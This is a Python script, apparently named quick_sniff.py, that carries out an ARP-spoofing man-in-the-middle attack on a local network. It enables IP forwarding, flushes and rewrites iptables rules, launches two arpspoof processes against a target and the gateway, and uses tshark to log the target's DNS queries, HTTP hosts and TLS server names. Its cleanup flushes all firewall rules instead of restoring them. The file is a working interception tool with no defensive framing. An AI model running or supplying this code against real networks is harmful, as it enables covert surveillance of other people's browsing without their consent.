import subprocess
import sys
import os
import signal
import time

def setup_routing(iface):
    print(f"[*] FORCING traffic to stay on {iface}...")
    
    # 1. Enable forwarding
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
    
    # 2. Reset Everything
    subprocess.run(["iptables", "-F"], check=True)
    subprocess.run(["iptables", "-t", "nat", "-F"], check=True)
    subprocess.run(["iptables", "-t", "mangle", "-F"], check=True)
    
    # 3. THE KALI FIX: Specifically block forwarding to eth0 if it exists
    # and force it to loop back to wlan0
    subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-o", iface, "-j", "ACCEPT"], check=True)
    
    # 4. Standard NAT
    subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", iface, "-j", "MASQUERADE"], check=True)
    
    # 5. TCP MSS Clamping (Fixes "Google only" issue)
    subprocess.run(["iptables", "-t", "mangle", "-A", "POSTROUTING", "-p", "tcp", "--tcp-flags", "SYN,RST", "SYN", "-j", "TCPMSS", "--clamp-mss-to-pmtu"], check=True)

    # 6. Diagnostic Logging (Check dmesg to see if packets are flowing)
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "LOG", "--log-prefix", "SNIFF_FWD: "], check=True)

def cleanup(signum, frame):
    print("\n[!] Cleaning up...")
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
    subprocess.run(["iptables", "-F"], check=False)
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
    os.system("killall arpspoof 2>/dev/null")
    print("[+] System restored.")
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 quick_sniff.py <TARGET_IP> <GATEWAY_IP> [IFACE]")
        sys.exit(1)

    target, gateway = sys.argv[1], sys.argv[2]
    iface = sys.argv[3] if len(sys.argv) > 3 else "wlan0"

    setup_routing(iface)

    print(f"[*] Starting Full-Duplex on {iface}")
    p1 = subprocess.Popen(["arpspoof", "-i", iface, "-t", target, gateway], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    p2 = subprocess.Popen(["arpspoof", "-i", iface, "-t", gateway, target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    signal.signal(signal.SIGINT, cleanup)
    print("[+] Sniffer active. Check 'dmesg -w' in another terminal for SNIFF_FWD logs.")
    print("-" * 50)

    sniff_cmd = [
        "tshark", "-i", iface, "-l", "-n",
        "-Y", f"ip.addr == {target} and (dns or http or tls.handshake.type == 1)",
        "-T", "fields",
        "-e", "dns.qry.name", "-e", "http.host", "-e", "tls.handshake.extensions_server_name"
    ]

    try:
        proc = subprocess.Popen(sniff_cmd, stdout=subprocess.PIPE, text=True)
        for line in iter(proc.stdout.readline, ""):
            line = line.strip().replace("\t", " ").strip()
            if line and "Capturing on" not in line:
                parts = [p for p in line.split(" ") if p]
                if parts:
                    print(f"[{time.strftime('%H:%M:%S')}] {parts[0]}")
    except:
        cleanup(None, None)
